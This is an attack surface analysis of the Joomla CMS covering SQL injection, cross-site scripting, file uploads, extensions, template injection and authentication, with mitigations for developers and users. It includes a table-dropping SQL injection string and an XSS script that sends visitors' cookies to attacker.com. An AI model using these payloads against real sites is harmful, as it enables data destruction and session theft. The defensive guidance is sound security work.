# Attack Surface Analysis for joomla/joomla-cms

## Attack Surface: [SQL Injection (SQLi)](./attack_surfaces/sql_injection__sqli_.md)

*   **Description:** Attackers inject malicious SQL code into application database queries, potentially allowing them to read, modify, or delete data.
    *   **How Joomla-CMS Contributes:** Joomla's core and, more commonly, third-party extensions might not properly sanitize user inputs before using them in database queries. Older versions of Joomla or poorly coded extensions are more susceptible.
    *   **Example:** A vulnerable search module in Joomla might allow an attacker to input `'; DROP TABLE users; --` into the search field, potentially deleting the user table.
    *   **Impact:** Data breach, data manipulation, complete compromise of the database.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Developers:** Utilize Joomla's database API and prepared statements (parameterized queries) to prevent direct SQL injection. Thoroughly sanitize and validate all user inputs before incorporating them into database queries. Regularly audit and review database interaction code in custom extensions.
        *   **Users:** Keep Joomla core and all extensions updated to the latest versions, as updates often include patches for SQL injection vulnerabilities. Avoid installing extensions from untrusted sources.

## Attack Surface: [Cross-Site Scripting (XSS)](./attack_surfaces/cross-site_scripting__xss_.md)

*   **Description:** Attackers inject malicious scripts into web pages viewed by other users. These scripts can steal cookies, redirect users, or perform actions on their behalf.
    *   **How Joomla-CMS Contributes:** Joomla's content management system and extensions might not properly sanitize user-supplied content before displaying it on web pages. This can occur in articles, comments, module content, or extension outputs.
    *   **Example:** An attacker could inject `<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>` into a comment field, stealing the cookies of users viewing that comment.
    *   **Impact:** Account takeover, defacement, redirection to malicious sites, information theft.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developers:** Implement robust input and output encoding/escaping techniques. Use Joomla's built-in functions for sanitizing output. Follow secure coding practices when developing extensions. Implement Content Security Policy (CSP) headers.
        *   **Users:** Keep Joomla core and extensions updated. Be cautious about installing extensions from unknown sources. Educate users about the risks of clicking on suspicious links.

## Attack Surface: [Insecure File Uploads](./attack_surfaces/insecure_file_uploads.md)

*   **Description:** Attackers upload malicious files (e.g., web shells) to the server, which they can then execute to gain control of the system.
    *   **How Joomla-CMS Contributes:** Joomla's core or extensions might have insufficient validation of uploaded file types, sizes, or content. Incorrectly configured permissions on upload directories can also exacerbate this issue.
    *   **Example:** An attacker uploads a PHP web shell disguised as an image through a vulnerable extension, then accesses it directly to execute commands on the server.
    *   **Impact:** Remote code execution, complete server compromise, data breach, website defacement.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Developers:** Implement strict file type validation based on content, not just extension. Sanitize file names. Store uploaded files outside the webroot if possible. Implement size limits. Use secure file handling functions.
        *   **Users:** Regularly review and secure file upload configurations in Joomla and installed extensions. Restrict file upload permissions to necessary users only. Keep Joomla and extensions updated.

## Attack Surface: [Third-Party Extension Vulnerabilities](./attack_surfaces/third-party_extension_vulnerabilities.md)

*   **Description:** Security flaws in third-party plugins, modules, components, or templates can be exploited to compromise the Joomla installation.
    *   **How Joomla-CMS Contributes:** Joomla's extensive ecosystem of third-party extensions, while offering great functionality, introduces a significant attack surface. The security of these extensions varies greatly depending on the developer's practices.
    *   **Example:** A popular gallery extension has a known vulnerability allowing unauthenticated users to delete arbitrary files on the server.
    *   **Impact:** Varies depending on the vulnerability, but can range from information disclosure to remote code execution.
    *   **Risk Severity:** High to Critical (depending on the vulnerability)
    *   **Mitigation Strategies:**
        *   **Developers:** Follow secure coding practices when developing extensions. Regularly update dependencies. Conduct security testing.
        *   **Users:** Only install extensions from reputable sources. Regularly update all installed extensions. Remove unused extensions. Monitor security advisories for known vulnerabilities in installed extensions.

## Attack Surface: [Server-Side Template Injection (SSTI)](./attack_surfaces/server-side_template_injection__ssti_.md)

*   **Description:** Attackers inject malicious code into template engines, allowing them to execute arbitrary code on the server.
    *   **How Joomla-CMS Contributes:** While less common in core Joomla, vulnerabilities in custom templates or extensions utilizing template engines (like Smarty, if integrated) can introduce SSTI risks.
    *   **Example:** An attacker injects template code into a user profile field that is then rendered by the template engine, allowing them to execute system commands.
    *   **Impact:** Remote code execution, complete server compromise.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Developers:** Avoid using user input directly in template rendering logic. If necessary, use secure templating practices and sandboxing mechanisms. Regularly update template engines.
        *   **Users:** Be cautious about installing templates from untrusted sources. Keep Joomla core and extensions updated.

## Attack Surface: [Authentication and Authorization Issues](./attack_surfaces/authentication_and_authorization_issues.md)

*   **Description:** Flaws in how Joomla authenticates users or authorizes access to resources can allow attackers to bypass security controls.
    *   **How Joomla-CMS Contributes:** Weak password policies, insufficient account lockout mechanisms, vulnerabilities in custom authentication plugins, or flaws in access control logic within extensions can contribute to this attack surface.
    *   **Example:** An attacker exploits a vulnerability in a custom authentication plugin to bypass the login process.
    *   **Impact:** Unauthorized access to sensitive data, privilege escalation, account takeover.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Developers:** Enforce strong password policies. Implement robust account lockout mechanisms. Follow secure coding practices for authentication and authorization logic in extensions. Use Joomla's built-in authorization framework.
        *   **Users:** Use strong, unique passwords. Enable two-factor authentication where available. Regularly review user permissions and remove unnecessary accounts.
